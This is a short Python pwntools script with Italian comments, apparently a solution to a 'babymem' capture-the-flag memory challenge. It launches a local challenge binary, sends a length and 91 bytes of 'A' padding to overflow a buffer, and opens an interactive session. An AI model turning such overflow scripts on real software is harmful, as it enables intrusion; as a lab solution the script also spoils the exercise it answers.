#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --


-----------------------------
'''

# Impostazione del livello di log
context.log_level = 'CRITICAL'

# File binario da eseguire
elf = ELF('/challenge/babymem-level-10-1')

# Avvio del processo con 'setuid = true'
p = elf.process()

# Preparazione del bytestream
delta_len = 91
bytestream = b'A' * delta_len

# Interazione con il processo e invio del bytestream
p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
